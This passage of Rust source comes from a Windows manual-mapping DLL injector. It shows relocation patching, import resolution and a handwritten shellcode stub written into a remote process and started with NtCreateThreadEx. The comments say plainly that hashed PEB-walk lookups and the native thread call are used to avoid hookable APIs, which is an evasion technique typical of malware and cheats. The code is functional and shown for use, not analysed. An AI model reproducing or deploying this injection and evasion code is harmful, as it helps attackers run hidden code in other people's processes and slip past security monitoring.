                    if block_size < 8 || offset + block_size > reloc_size {
                        break;
                    }
                    let entries_count = (block_size - 8) / 2;
                    let entries_start = offset + 8;
                    for i in 0..entries_count {
                        let off = entries_start + i * 2;
                        let entry =
                            u16::from_le_bytes(reloc_data[off..off + 2].try_into().unwrap());
                        let reloc_type = (entry >> 12) as u8;
                        let reloc_offset = (entry & 0x0FFF) as usize;
                        let field_rva = page_rva + reloc_offset;

                        match reloc_type {
                            // IMAGE_REL_BASED_DIR64: 64-bit absolute VA (x64, ARM64)
                            10 => {
                                let mut buf = [0u8; 8];
                                let mut n = 0usize;
                                let src = (remote_base as usize + field_rva) as *const c_void;
                                ReadProcessMemory(
                                    target_process,
                                    src,
                                    buf.as_mut_ptr() as *mut c_void,
                                    8,
                                    &mut n,
                                );
                                let val = i64::from_le_bytes(buf);
                                let patched = (val as isize + base_delta).to_le_bytes();
                                write_remote(field_rva, &patched)?;
                            }
                            // IMAGE_REL_BASED_HIGHLOW: 32-bit absolute VA (x86)
                            3 => {
                                let mut buf = [0u8; 4];
                                let mut n = 0usize;
                                let src = (remote_base as usize + field_rva) as *const c_void;
                                ReadProcessMemory(
                                    target_process,
                                    src,
                                    buf.as_mut_ptr() as *mut c_void,
                                    4,
                                    &mut n,
                                );
                                let val = i32::from_le_bytes(buf);
                                let patched =
                                    ((val as isize + base_delta) as i32).to_le_bytes();
                                write_remote(field_rva, &patched)?;
                            }
                            0 => {} // padding
                            _ => {
                                #[cfg(debug_assertions)]
                                tracing::debug!(
                                    "remote_manual_map: skipping unhandled reloc type \
                                     {reloc_type} at page_rva+offset {field_rva:#x}"
                                );
                            }
                        }
                    }
                    offset += block_size;
                }
            }
        }
    }

    // ── Step 4b: resolve IAT ──────────────────────────────────────────────
    // On Windows, system DLLs (ntdll, kernel32, kernelbase, …) are mapped at
    // the same virtual address in every process per-boot (they share a single
    // ASLR base due to copy-on-write physical pages).  Resolving via
    // GetModuleHandleA + GetProcAddress in OUR process therefore yields the
    // correct address for the remote process.  User-mode DLLs that are NOT
    // system DLLs may differ; those are relatively rare as DLL imports.
    for import in &pe.imports {
        let dll_name_cstr = std::ffi::CString::new(import.dll)
            .map_err(|_| anyhow!("import DLL name contains NUL: {}", import.dll))?;
        let fn_name_cstr = std::ffi::CString::new(import.name.as_str())
            .map_err(|_| anyhow!("import function name contains NUL: {}", import.name))?;

        // M-26: resolve via PEB walk + clean export table instead of the
        // hookable GetModuleHandleA / GetProcAddress IAT entries.
        let dll_hash = pe_resolve::hash_str(dll_name_cstr.to_bytes_with_nul());
        let mod_base = pe_resolve::get_module_handle_by_hash(dll_hash).unwrap_or(0);
        if mod_base == 0 {
            return Err(anyhow!(
                "PEB-walk failed for '{}': not loaded in current process",
                import.dll
            ));
        }
        let fn_hash = pe_resolve::hash_str(fn_name_cstr.to_bytes_with_nul());
        let proc_addr = pe_resolve::get_proc_address_by_hash(mod_base, fn_hash).unwrap_or(0);
        if proc_addr == 0 {
            return Err(anyhow!(
                "PEB-walk export resolution failed for '{}' in '{}'",
                import.name,
                import.dll
            ));
        }

        // Write the resolved function pointer into the remote IAT slot.
        let iat_addr_bytes = (proc_addr as usize).to_le_bytes();
        write_remote(import.rva, &iat_addr_bytes)?;
    }

    // ── Step 5: invoke DllMain via a shellcode stub ───────────────────────
    // DllMain expects (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved).
    // CreateRemoteThread only passes a single LPVOID parameter, so calling the
    // entry point directly would give DllMain garbage in rcx/rdx/r8.  We write
    // a small position-independent x86-64 stub that sets up the correct
    // calling-convention arguments before jumping to DllMain.
    let entry_rva = opt.standard_fields.address_of_entry_point as usize;
    if entry_rva != 0 {
        let entry_va = remote_base as usize + entry_rva;

        // Shellcode (x86-64, position-independent):
        //   mov rcx, <remote_base>      ; HINSTANCE hinstDLL
        //   mov edx, 1                  ; DLL_PROCESS_ATTACH
        //   xor r8d, r8d                ; lpvReserved = NULL
        //   mov rax, <entry_va>         ; entry point address
        //   call rax
        //   ret
        let mut stub: Vec<u8> = Vec::with_capacity(30);
        stub.extend_from_slice(&[0x48, 0xB9]);
        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
        stub.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
        stub.extend_from_slice(&[0x45, 0x31, 0xC0]);
        stub.extend_from_slice(&[0x48, 0xB8]);
        stub.extend_from_slice(&(entry_va as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);
        stub.extend_from_slice(&[0xC3]);

        // Allocate memory for the stub (RW first so we can write it).
        let stub_mem = VirtualAllocEx(
            target_process,
            std::ptr::null_mut(),
            stub.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if stub_mem.is_null() {
            return Err(anyhow!(
                "VirtualAllocEx for DllMain stub failed: {}",
                std::io::Error::last_os_error()
            ));
        }

        let mut written = 0usize;
        WriteProcessMemory(
            target_process,
            stub_mem,
            stub.as_ptr() as *const c_void,
            stub.len(),
            &mut written,
        );

        // Make the stub executable (RX only — no need for write after writing).
        let mut old_prot = 0u32;
        VirtualProtectEx(
            target_process,
            stub_mem,
            stub.len(),
            PAGE_EXECUTE_READ,
            &mut old_prot,
        );

        // M-27: Use NtCreateThreadEx via PEB walk instead of hookable CreateRemoteThread.
        let ntdll_hash: u32 = pe_resolve::hash_str(b"ntdll.dll\0");
        let ntdll_base = pe_resolve::get_module_handle_by_hash(ntdll_hash)
            .ok_or_else(|| anyhow!("manual_map: ntdll not found via PEB walk"))?;
        let ntcreate_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
        let ntcreate_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, ntcreate_hash)
            .ok_or_else(|| anyhow!("manual_map: NtCreateThreadEx not found via PEB walk"))?;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut winapi::ctypes::c_void, // ThreadHandle
            u32,                               // DesiredAccess
            *mut winapi::ctypes::c_void,       // ObjectAttributes
            *mut winapi::ctypes::c_void,       // ProcessHandle
            *mut winapi::ctypes::c_void,       // StartRoutine
            *mut winapi::ctypes::c_void,       // Argument
            u32,                               // CreateFlags
            usize,                             // ZeroBits
            usize,                             // StackSize
            usize,                             // MaximumStackSize
            *mut winapi::ctypes::c_void,       // AttributeList
        ) -> i32;
        let nt_create_thread: NtCreateThreadExFn =
            std::mem::transmute(ntcreate_addr as *const ());

        let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
        let status = nt_create_thread(
            &mut h_thread,
            0x1FFFFF,              // THREAD_ALL_ACCESS
            std::ptr::null_mut(),
            target_process,
            stub_mem,
            std::ptr::null_mut(),
            0,                     // No creation flags — run immediately
            0,
            0,
            0,
            std::ptr::null_mut(),
        );
        if status < 0 || h_thread.is_null() {
            return Err(anyhow!(
                "NtCreateThreadEx for DllMain stub failed: {:x}",
                status
            ));
        }
        // Close the thread handle immediately; we don't wait for it.
        pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
    }

    Ok(remote_base)
}

